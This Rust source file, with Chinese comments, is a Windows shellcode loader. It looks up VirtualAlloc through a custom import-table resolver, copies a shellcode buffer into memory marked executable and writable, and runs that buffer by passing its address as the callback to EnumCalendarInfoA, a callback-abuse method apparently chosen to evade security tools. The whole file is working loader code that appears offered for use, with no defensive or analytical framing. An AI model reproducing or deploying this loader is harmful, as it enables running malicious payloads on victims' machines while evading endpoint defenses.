use std::mem::transmute;
use windows::core::Result;
use std::ffi::c_void;
use crate::iat::get_function_address;

pub(crate) fn callback(buf: &[u8]) -> Result<()> {
    unsafe {
        // 使用自定义方法获取 VirtualAlloc 地址
        let virtual_alloc_addr = get_function_address("kernel32.dll", "VirtualAlloc")?;
        let virtual_alloc_fn: unsafe extern "system" fn(
            *mut c_void, // lpAddress
            usize,       // dwSize
            u32,         // flAllocationType
            u32,         // flProtect
        ) -> *mut c_void = transmute(virtual_alloc_addr);

        // 分配内存
        let addr = virtual_alloc_fn(
            std::ptr::null_mut(),
            buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if addr.is_null() {
            return Err(windows::core::Error::from_win32());
        }

        // 复制 shellcode
        std::ptr::copy_nonoverlapping(buf.as_ptr().cast(), addr, buf.len());

        // 使用自定义方法获取 EnumCalendarInfoA 地址
        let enum_calendar_info_addr = get_function_address("kernel32.dll", "EnumCalendarInfoA")?;
        let enum_calendar_info_fn: unsafe extern "system" fn(
            Option<unsafe extern "system" fn(*mut i16) -> i32>, // lpCalInfoEnumProc
            u32,        // Locale
            u32,        // Calendar
            u32,        // CalType
        ) -> i32 = transmute(enum_calendar_info_addr);

        // 调用 EnumCalendarInfoA，将 shellcode 地址作为回调函数
        let result = enum_calendar_info_fn(
            Some(transmute(addr)),
            0x0c00,     // LOCALE_SYSTEM_DEFAULT
            ENUM_ALL_CALENDARS,
            CAL_SMONTHNAME1,
        );

        if result == 0 {
            return Err(windows::core::Error::from_win32());
        }
    }
    return Ok(());
}

// 常量定义
const MEM_COMMIT: u32 = 0x00001000;
const MEM_RESERVE: u32 = 0x00002000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const ENUM_ALL_CALENDARS: u32 = 0xFFFFFFFF;
const CAL_SMONTHNAME1: u32 = 0x00000015;